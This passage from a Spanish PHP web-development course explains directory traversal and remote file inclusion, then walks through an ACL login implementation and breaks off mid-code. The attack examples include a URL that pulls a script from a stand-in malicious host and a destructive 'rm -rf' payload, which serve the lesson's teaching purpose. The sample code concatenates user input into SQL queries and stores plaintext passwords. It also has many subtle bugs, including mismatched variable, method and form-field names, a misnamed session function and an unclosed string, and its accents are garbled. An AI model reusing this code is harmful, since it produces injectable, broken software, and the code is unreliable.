<h3 id="345-dt-directory-transversal">3.4.5. DT (directory transversal)</h3>

<p>Este ataque se produce cuando el atacante logra <strong>acceder a ficheros del servidor que est√°n fuera del directorio de la aplicaci√≥n</strong> y que, te√≥ricamente, no deber√≠an ser accesibles desde esta.</p>

<p>Es f√°cil comprender c√≥mo puede montarse un ataque as√≠. Imagina un programa PHP que haga un <em>include()</em> de este estilo:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">include</span> <span class="p">(</span><span class="s2">"views/"</span> <span class="mf">.</span> <span class="nv">$viewName</span><span class="p">);</span>
</code></pre></div></div>

<p>Si un atacante logra manipular la variable <em>$viewName</em> para asignarle, por ejemplo, el valor ‚Äú../../../../otro-fichero.php‚Äù, nuestro programa har√° un include de un fichero que est√° claramente fuera de los directorios de la aplicaci√≥n.</p>

<p>Para evitar este tipo de ataques, algunas estrategias son:</p>

<ul>
  <li><strong>Tener un array de p√°ginas y carpetas v√°lidas</strong>. Si un include trata de acceder a un recurso que no est√° en la lista, se sospechar√° de un ataque.</li>
  <li><strong>Buscar caracteres sospechosos en los nombres de los archivos</strong>. Si la variable <em>$viewName</em> del ejemplo anterior incluye los caracteres ‚Äú../‚Äù, la cosa se pone fea. No en vano, el ataque Directory Transversal tambi√©n se denomina ‚Äúataque punto punto barra‚Äù.</li>
</ul>

<h3 id="346-rfi-remote-file-inclusion">3.4.6. RFI (remote file inclusion)</h3>

<p>Este ataque se produce cuando <strong>se incluye un archivo remoto</strong> explotando una vulnerabilidad del c√≥digo fuente.</p>

<p>Imagina, como antes, un programa PHP que haga un <em>include()</em> tan com√∫n como este:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">include</span> <span class="p">(</span><span class="nv">$viewName</span><span class="p">);</span>
</code></pre></div></div>

<p>Imagina tambi√©n que este c√≥digo se invoque normalmente mediante una petici√≥n del estilo: https://sitio-confiable.com?view=main.php. O algo parecido. Es una estrategia habitual en muchas aplicaciones web.</p>

<p>Pues bien, un atacante podr√≠a pedir la siguiente URL: https://sitio-confiable.com?view=https://sitio-malicioso/soy-un-script-malvado.php</p>

<p>Es decir, ha colocado como <em>$viewName</em> la URL de un programa PHP externo a nuestro servidor, y nuestro programa har√° un <em>include()</em> de ese c√≥digo tan feliz y contento, sin saber que se trata de c√≥digo malicioso que acabar√° directamente en las tripas de nuestro programa.</p>

<p>Una vez que <em>soy-un-script-malvado.php</em> se est√© ejecutando en el servidor <em>sitio-confiable.com</em>, puede hacer cosas terribles, como, por ejemplo, esta:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="nb">system</span><span class="p">(</span><span class="s2">"rm -rf"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>(No te digo lo que hace ese comando por si se te ocurre probarlo, pero ya te adelanto que no es agradable).</p>

<p>Para prevenir los ataques por RFI, algunas estrategias v√°lidas son:</p>

<ul>
  <li><strong>No confiar en los datos</strong> que no provengan de nuestro sistema.</li>
  <li><strong>Validar y filtrar los datos</strong> que introduce el usuario (s√≠, otra vez: validar, validar y validar cualquier cosa que provenga del usuario).</li>
</ul>

<h2 id="35-caso-pr√°ctico-resuelto-autenticaci√≥n-mediante-acl">3.5. Caso pr√°ctico resuelto: autenticaci√≥n mediante ACL</h2>

<p>En esta secci√≥n, vamos a poner en pr√°ctica muchas de las cosas que hemos visto en este tema mediante un caso pr√°ctico realista y completamente resuelto.</p>

<p>Completamente resuelto pero mejorable, porque una aplicaci√≥n inform√°tica <em>siempre</em> se puede mejorar.</p>

<p>De hecho, en la siguiente secci√≥n afrontaremos varias mejoras que tendr√°s que intentar t√∫ en forma de ejercicios propuestos. ¬øO pensabas que iba a hacer yo todo el trabajo?</p>

<h3 id="351-qu√©-es-la-autenticaci√≥n-mediante-acl">3.5.1. Qu√© es la autenticaci√≥n mediante ACL</h3>

<p>Casi todas las aplicaciones web incluyen un subsistema de autenticaci√≥n de usuarios. El m√°s completo de esos subsistemas es el de las <strong>lisas de control de acceso</strong> (ACL = Access Control List).</p>

<p>Ese subsistema suele estar basado en este dise√±o de base de datos:</p>

<p><img src="/docs/dwes/_site/assets/images/03-acl.jpg" alt="Tablas ACL" /></p>

<p>Esto significa que necesitamos <strong>cinco tablas</strong> para implementar un ACL completo.</p>

<p>Sin embargo, muchas veces tendremos suficiente con solo tres tablas (usuarios, roles y usuarios-roles), o incluso solo con una (usuarios, a√±adiendo quiz√° un campo ‚Äútipo‚Äù).</p>

<p><strong>Optar por una soluci√≥n m√°s o menos compleja depender√° del tipos de sistema que estemos implementando.</strong></p>

<p>En cualquier caso, es conveniente que conozcas el esquema ACL completo (es decir, el de 5 tablas) para que lo pongas en pr√°ctica cuando lo necesites. Por eso te lo he presentado. Ahora ya sois oficialmente amigos.</p>

<h3 id="352-una-implementaci√≥n-de-autenticaci√≥n-mediante-acl">3.5.2. Una implementaci√≥n de autenticaci√≥n mediante ACL</h3>

<p>Como ocurre con muchos conceptos en el √°mbito de la programaci√≥n, las ACL se entienden mejor vi√©ndolas que explic√°ndolas. As√≠ que vamos a hacer una implementaci√≥n de ejemplo, que de paso nos servir√° para mostrar en acci√≥n muchas de las cosas que hemos visto en este tema.</p>

<p>Ojo, que esta es solo <em>una de las posibles implementaciones</em>. Pueden existir mil variaciones. Pero, como suced√≠a con los ejemplos que hemos visto anteriormente, te servir√° como base para tu propia implementaci√≥n de una ACL.</p>

<p><strong>IMPORTANTE</strong>: en esta implementaci√≥n ver√°s una distribuci√≥n de archivos un poco peculiar y que, a primera vista, puede resultarte hasta caprichosa. No te agobies. Hemos respetado una arquitectura de aplicaciones denominada <strong><em>modelo-vista-controlador</em></strong> o <strong><em>MVC</em></strong>. Hablaremos largo y tendido sobre esa arquitectura m√°s adelante, y entonces comprender√°s que la distribuci√≥n del c√≥digo no ten√≠a nada de caprichosa.</p>

<p>Por ahora, solo tienes que seguir la pista a lo que sucede, y ni siquiera es necesario que lo entiendas al 100%. Un 80% ya estar√≠a genial. Un 50% ser√≠a suficiente. Tu comprensi√≥n de este c√≥digo aumentar√° cuando tengas que utilizarlo y adaptarlo a tus propios proyectos.</p>

<h4 id="nuestras-tablas-acl">Nuestras tablas ACL</h4>

<p>Vamos a suponer que esta autenticaci√≥n con ACL se est√° implementando para un sistema de publicaci√≥n de noticias (un blog, un peri√≥dico digital o algo semejante). Solo por darle un poco de contexto. Realmente, cambiando los permisos, podr√≠a utilizarse casi para cualquier web.</p>

<p>Haremos una implementaci√≥n completa del ACL, es decir, con las cinco tablas. Esas cinco tablas tendr√°n el siguiente aspecto (te muestro algunos datos de ejemplo para que quede m√°s claro de lo que estamos hablando):</p>

<p><strong>TABLA USUARIOS</strong></p>

<table>
  <thead>
    <tr>
      <th>IdUsuario</th>
      <th>Email</th>
      <th>Passwd</th>
      <th>Nombre</th>
      <th>Telef</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>jp@gmail.com</td>
      <td>sgsdfgjk8yias</td>
      <td>Juan P√©rez</td>
      <td>600 230 xxx</td>
    </tr>
    <tr>
      <td>2</td>
      <td>ms@gmail.com</td>
      <td>239ywds9$</td>
      <td>Mar√≠a S√°nchez</td>
      <td>700 398 yyy</td>
    </tr>
    <tr>
      <td>Etc</td>
      <td>Etc</td>
      <td>Etc</td>
      <td>Etc</td>
      <td>Etc</td>
    </tr>
  </tbody>
</table>

<p><strong>TABLA ROLES</strong></p>

<table>
  <thead>
    <tr>
      <th>IdRol</th>
      <th>Descripcion</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>Administrador</td>
    </tr>
    <tr>
      <td>2</td>
      <td>Editor</td>
    </tr>
    <tr>
      <td>3</td>
      <td>Usuario</td>
    </tr>
  </tbody>
</table>

<p><strong>TABLA USUARIOS-ROLES</strong></p>

<table>
  <thead>
    <tr>
      <th>IdUsuario</th>
      <th>IdRol</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>1</td>
    </tr>
    <tr>
      <td>2</td>
      <td>3</td>
    </tr>
    <tr>
      <td>3</td>
      <td>2</td>
    </tr>
    <tr>
      <td>etc</td>
      <td>etc</td>
    </tr>
  </tbody>
</table>

<p><strong>TABLA PERMISOS</strong></p>

<table>
  <thead>
    <tr>
      <th>IdPermiso</th>
      <th>Descripcion</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>Crear contenido nuevo</td>
    </tr>
    <tr>
      <td>2</td>
      <td>Editar contenido propio</td>
    </tr>
    <tr>
      <td>3</td>
      <td>Editar contenido ajeno</td>
    </tr>
    <tr>
      <td>4</td>
      <td>Borrar contenido propio</td>
    </tr>
    <tr>
      <td>5</td>
      <td>Borrar contenido ajeno</td>
    </tr>
    <tr>
      <td>6</td>
      <td>Publicar contenido propio</td>
    </tr>
    <tr>
      <td>7</td>
      <td>Publicar contenido ajeno</td>
    </tr>
    <tr>
      <td>8</td>
      <td>Leer contenido publicado</td>
    </tr>
  </tbody>
</table>

<p><strong>TABLA ROLES-PERMISOS</strong></p>

<table>
  <thead>
    <tr>
      <th>IdRol</th>
      <th>IdPermiso</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>1</td>
    </tr>
    <tr>
      <td>1</td>
      <td>2</td>
    </tr>
    <tr>
      <td>1</td>
      <td>3</td>
    </tr>
    <tr>
      <td>1</td>
      <td>4</td>
    </tr>
    <tr>
      <td>1</td>
      <td>5</td>
    </tr>
    <tr>
      <td>1</td>
      <td>6</td>
    </tr>
    <tr>
      <td>1</td>
      <td>7</td>
    </tr>
    <tr>
      <td>1</td>
      <td>8</td>
    </tr>
    <tr>
      <td>2</td>
      <td>1</td>
    </tr>
    <tr>
      <td>2</td>
      <td>2</td>
    </tr>
    <tr>
      <td>2</td>
      <td>6</td>
    </tr>
    <tr>
      <td>2</td>
      <td>8</td>
    </tr>
    <tr>
      <td>3</td>
      <td>8</td>
    </tr>
  </tbody>
</table>

<p>Observa que, con estas tablas, queda perfectamente definido a qu√© perfil de usuario (o ‚Äúrol‚Äù) pertenece cada usuario y qu√© cosas puede hacer con ese perfil.</p>

<p>Por ejemplo, el usuario Juan P√©rez, que tiene el Id = 1, es un Administrador, porque tiene asociado el rol 1 en la tabla <em>usuarios-roles</em>. Y los administradores tienen permiso para hacerlo absolutamente todo, seg√∫n se desprende de la tabla <em>roles-permisos</em>.</p>

<p>En cambio, la usuaria Mar√≠a S√°nchez (Id = 2) tiene perfil de Editor, y los editores solo tienen permiso para cuatro operaciones: Crear contenido nuevo, Editar su propio contenido, Publicar su propio contenido y Leer el contenido publicado.</p>

<h4 id="c√≥digo-fuente-de-nuestra-implementaci√≥n">C√≥digo fuente de nuestra implementaci√≥n</h4>

<p>En esta implementaci√≥n, no escribiremos el c√≥digo para hacer cosas como ‚ÄúCrear contenido nuevo‚Äù o ‚ÄúPublicar contenido‚Äù. Eso depender√° del sistema concreto que estemos programando, y no es lo que nos interesa ahora.</p>

<p>Lo que nos interesa es ver c√≥mo se autentica un usuario en una aplicaci√≥n web y c√≥mo se le puede dar acceso a unas funcionalidades o a otras dependiendo del contenido de las tablas ACL.</p>

<p>Una vez autenticado, el usuario acceder√° a una vista diferente de la aplicaci√≥n dependiendo de sus privilegios, donde se le mostrar√°n las opciones de que dispone. Es decir, si el usuario que se loguea es Juan P√©rez, que tiene rol de Administrador, la aplicaci√≥n debe mostrarle estas opciones:</p>

<ul>
  <li>Editar contenido (propio y ajeno)</li>
  <li>Borrar contenido (propio y ajeno)</li>
  <li>Publicar contenido (propio y ajeno)</li>
  <li>Leer contenido</li>
  <li>Crear contenido</li>
</ul>

<p>En cambio, si se loguea Mar√≠a S√°nchez, que tiene perfil de Editor, las opciones deben reducirse a:</p>

<ul>
  <li>Editar contenido (propio)</li>
  <li>Publicar contenido (propio)</li>
  <li>Leer contenido</li>
  <li>Crear contenido</li>
</ul>

<p><strong>Insisto en una idea muy importante</strong>: no es necesario que comprendas la totalidad de este c√≥digo en este momento. Basta con que te esfuerces en captar la idea general. Volver√°s sobre √©l, y sobre infinitas variedades de √©l, m√°s adelante, cada vez con mayor comprensi√≥n de lo que est√° sucediendo. As√≠ que l√©elo sin prisa y sin agobios, como quien se adentra en la traducci√≥n de un texto escrito en una lengua que se parece un poco a la suya sin llegar a serlo.</p>

<p>Una √∫ltima advertencia: esta soluci√≥n presenta algunos problemas de seguridad (como no filtrar las variables procedentes de un formulario) que resolveremos en los ejercicios propuestos m√°s adelante.</p>

<p><strong>Archivo index.php</strong></p>

<p>Este archivo captura la variable <em>action</em> desde la URL. Esta variable, como ya vimos en el ejemplo de la Biblioteca, indica a la aplicaci√≥n qu√© es lo que debe hacer.</p>

<p>Luego se instancia un objeto de tipo <em>Controller</em> y se invoca un m√©todo con el mismo nombre que la <em>action</em>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="k">include</span><span class="p">(</span><span class="s2">"controller.php"</span><span class="p">);</span>
  <span class="nv">$controller</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Controller</span><span class="p">();</span>

  <span class="c1">// Miramos a ver si hay alguna acci√≥n pendiente de realizar</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="c1">// No la hay. Usamos la acci√≥n por defecto (mostrar el formulario de login)</span>
    <span class="nv">$action</span> <span class="o">=</span> <span class="s2">"showLoginForm"</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// S√≠ la hay. La recuperamos.</span>
    <span class="nv">$action</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'action'</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="c1">// Ejecutamos el m√©todo del controlador que se llame como la acci√≥n</span>
  <span class="nv">$controlador</span><span class="o">-&gt;</span><span class="nv">$action</span><span class="p">();</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p><strong>CONTROLADOR (archivo controller.php)</strong></p>

<p>En el controlador est√°n reflejadas todas las posibles acciones que puede realizar la aplicaci√≥n.</p>

<p>Es decir, tiene que haber un m√©todo por cada posible valor de la variable <em>action</em>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">start_session</span><span class="p">();</span>    <span class="c1">// Si no se ha hecho en el index, claro</span>

    <span class="kd">class</span> <span class="nc">Controller</span> <span class="p">{</span>

        <span class="k">private</span> <span class="nv">$view</span><span class="p">,</span> <span class="nv">$user</span><span class="p">;</span>

        <span class="cd">/**
         * Constructor. Crea el objeto vista y los modelos
         */</span>
        <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span> <span class="o">=</span> <span class="k">New</span> <span class="nc">View</span><span class="p">();</span>       <span class="c1">// Vistas</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span> <span class="o">=</span> <span class="k">New</span> <span class="nc">User</span><span class="p">();</span>       <span class="c1">// Modelo de usuarios</span>
        <span class="p">}</span>

        <span class="cd">/**
         * Muestra el formulario de login
         */</span>
        <span class="k">public</span> <span class="k">function</span> <span class="n">showLoginForm</span><span class="p">()</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"loginForm"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="cd">/**
         * Procesa el formulario de login y, si es correcto, inicia la sesi√≥n con el id del usuario.
         * Redirige a la vista de selecci√≥n de rol.
         */</span>
        <span class="k">public</span> <span class="k">function</span> <span class="n">processLoginForm</span><span class="p">()</span> <span class="p">{</span>

            <span class="c1">// Validaci√≥n del formulario</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">||</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// Alg√∫n campo del formulario viene vac√≠o: volvemos a mostrar el login</span>
                <span class="nv">$data</span><span class="p">[</span><span class="s1">'errorMsg'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"El email y la contrase√±a son obligatorios"</span><span class="p">;</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"loginForm"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="c1">// Hemos pasado la validaci√≥n del formulario: vamos a procesarlo</span>
                <span class="nv">$userData</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">checkLogin</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$userData</span><span class="p">)</span> <span class="p">{</span>
                    <span class="c1">// Login correcto: creamos la sesi√≥n y pedimos al usuario que elija su rol</span>
                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'idUser'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$userData</span><span class="o">-&gt;</span><span class="n">idUser</span><span class="p">;</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">SelectUserRolForm</span><span class="p">();</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                    <span class="nv">$data</span><span class="p">[</span><span class="s1">'errorMsg'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"Usuario o contrase√±a incorrectos"</span><span class="p">;</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"loginForm"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="cd">/**
         * Muestra formulario de selecci√≥n de rol de usuario
         */</span>
        <span class="k">public</span> <span class="k">function</span> <span class="n">selectUserRolForm</span><span class="p">()</span> <span class="p">{</span>
            <span class="nv">$data</span><span class="p">[</span><span class="s1">'roles'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">getUserRoles</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'idUser'</span><span class="p">]);</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"selectUserRolForm"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
            <span class="c1">// Posible mejora: si el usuario solo tiene un rol, la aplicaci√≥n podr√≠a seleccionarlo autom√°ticamnte</span>
            <span class="c1">// y saltar a $this-&gt;showMainMenu()</span>
        <span class="p">}</span>

        <span class="cd">/**
         * Procesa el formulario de selecci√≥n de rol de usuario y crea una variable de sesi√≥n para almacenarlo.
         * Redirige al men√∫ principal.
         */</span>
        <span class="k">public</span> <span class="k">function</span> <span class="n">processSelectUserRolForm</span><span class="p">()</span> <span class="p">{</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userRol'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'userRol'</span><span class="p">];</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">showMainMenu</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="cd">/**
         * Muestra el men√∫ de opciones del usuario seg√∫n la tabla de persmisos
         */</span>
        <span class="k">public</span> <span class="k">function</span> <span class="n">showMainMenu</span><span class="p">()</span> <span class="p">{</span>
            <span class="nv">$data</span><span class="p">[</span><span class="s1">'permissions'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">getUserPermissions</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userRol'</span><span class="p">]);</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"mainMenu"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p><strong>VISTA (view.php)</strong></p>

<p>Este archivo contiene un m√©todo gen√©rico (dentro de la clase View) para mostrar cualquier otra vista, cuyo nombre se le pasa como par√°metro desde el controlador.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">class</span> <span class="nc">View</span> <span class="p">{</span>
		<span class="k">public</span> <span class="k">function</span> <span class="n">mostrar</span><span class="p">(</span><span class="nv">$nombreVista</span><span class="p">,</span> <span class="nv">$data</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">include_once</span><span class="p">(</span><span class="s2">"views/header.php"</span><span class="p">);</span>
			<span class="k">include_once</span><span class="p">(</span><span class="s2">"views/</span><span class="nv">$nombreVista</span><span class="s2">.php"</span><span class="p">);</span>
			<span class="k">include_once</span><span class="p">(</span><span class="s2">"views/footer.php"</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
</code></pre></div></div>

<p><strong>VISTA loginForm (archivo views/loginForm.php)</strong></p>

<p>Esta vista muestra el formulario de login. La dejamos preparada para mostrar, opcionalmente, un mensaje de error (del tipo ‚Äúusuario o contrase√±a incorrectos‚Äù) o un mensaje informativo (del tipo ‚ÄúSesi√≥n cerrada con √©xito‚Äù).</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'errorsMsg'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"&lt;p style='color:red'&gt;"</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'msjError'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"&lt;/p&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'infoMsg'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"&lt;p style='color:blue'&gt;"</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'msjInfo'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"&lt;/p&gt;"</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">echo</span> <span class="s2">"&lt;form action='index.php'&gt;
                Usuario:&lt;input type='text' name='usr'&gt;&lt;br&gt;
                Contrase√±a:&lt;input type='password' name='pass'&gt;&lt;br&gt;
                &lt;input type='hidden' name='action' value='processLoginForm'&gt;
                &lt;input type='submit'&gt;
             &lt;/form&gt;"</span><span class="p">;</span>
</code></pre></div></div>

<p><strong>VISTA selectUserRolForm (archivo views/selectUserRolForm.php)</strong></p>

<p>Esta vista muestra la lista de roles de un usuario. Sirve por si un usuario tiene asignado m√°s de un rol. As√≠, antes de terminar el login, podr√° elegir con qu√© rol quiere ingresar en la aplicaci√≥n.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">echo</span> <span class="s2">"Selecciona el rol&lt;br&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">"&lt;form action='index.php'&gt;"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">"&lt;select name='idRol'&gt;"</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'roles'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$rol</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"&lt;option value='"</span><span class="mf">.</span><span class="nv">$rol</span><span class="o">-&gt;</span><span class="n">idRol</span><span class="mf">.</span><span class="s2">"'&gt;"</span><span class="mf">.</span><span class="nv">$rol</span><span class="o">-&gt;</span><span class="n">description</span><span class="mf">.</span><span class="s2">"&lt;option&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">"&lt;input type='hidden' name='action' value='processSelectUserRolForm"</span>
        <span class="k">echo</span> <span class="s2">"&lt;input type='submit'&gt;"</span><span class="p">;</span>
</code></pre></div></div>

<p><strong>VISTA mainMenu (archivo views/mainMenu.php)</strong></p>

<p>Esta vista muestra las opciones del programa asociadas a un usuario concreto. Cada opci√≥n es un enlace a la propia aplicacion con un valor diferente para la variable <em>action</em>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">echo</span> <span class="s2">"Men√∫ principal&lt;br&gt;"</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'permissions'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$permission</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"&lt;a href='index.php?action="</span><span class="mf">.</span><span class="nv">$permission</span><span class="o">-&gt;</span><span class="n">action</span><span class="mf">.</span><span class="s2">"&gt;"</span><span class="mf">.</span><span class="nv">$permission</span><span class="o">-&gt;</span><span class="n">description</span><span class="mf">.</span><span class="s2">"&lt;/a&gt;&lt;br&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
</code></pre></div></div>

<p><strong>MODELO (archivo user.php)</strong></p>

<p>El modelo contiene todos los m√©todos necesarios para acceder a la base de datos (o, en general, a cualquier recurso del servidor). Esos m√©todos siempre se invocan desde el controlador.</p>

<p>En este caso, llamamos <em>user.php</em> al modelo porque acceder√° √∫nicamente a la tabla de usuarios.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="kd">class</span> <span class="nc">User</span> <span class="p">{</span>

        <span class="k">private</span> <span class="nv">$db</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
           <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="s2">"db-host"</span><span class="p">,</span> <span class="s2">"db-user"</span><span class="p">,</span> <span class="s2">"db-password"</span><span class="p">,</span> <span class="s2">"db-name"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">function</span> <span class="n">checkLogin</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"SELECT idUser FROM users WHERE email = '</span><span class="nv">$email</span><span class="s2">' AND password = '</span><span class="nv">$pass</span><span class="s2">'"</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$usuario</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_object</span><span class="p">();</span>
                    <span class="k">return</span> <span class="nv">$usuario</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">function</span> <span class="n">getUserRoles</span><span class="p">(</span><span class="nv">$idUser</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$resultArray</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"SELECT roles.* FROM roles
                                            INNER JOIN user_roles ON roles.id = user_roles.idRol
                                            WHERE user_roles.idUser = '</span><span class="nv">$idUser</span><span class="s2">'"</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">while</span> <span class="p">(</span><span class="nv">$rol</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_object</span><span class="p">())</span> <span class="p">{</span>
